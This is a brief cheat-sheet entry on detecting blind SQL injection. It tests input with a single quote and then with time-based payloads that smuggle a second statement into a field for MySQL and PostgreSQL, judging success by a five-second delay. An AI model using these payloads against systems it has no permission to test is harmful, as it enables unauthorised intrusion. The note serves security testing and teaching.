### Blind injection

#### Check for vulnerabilities

1. Try `'`

If something wonky happens, the system is likely vulnerable.

2. Blind injection methods

| Database   | Command |
| ---------- | ------- |
| MySQL      | `'; SELECT SLEEP(5);--` |
| PostgreSQL | `'; SELECT PG_SLEEP(5);--` |

Success if the system takes ~5 seconds to respond.
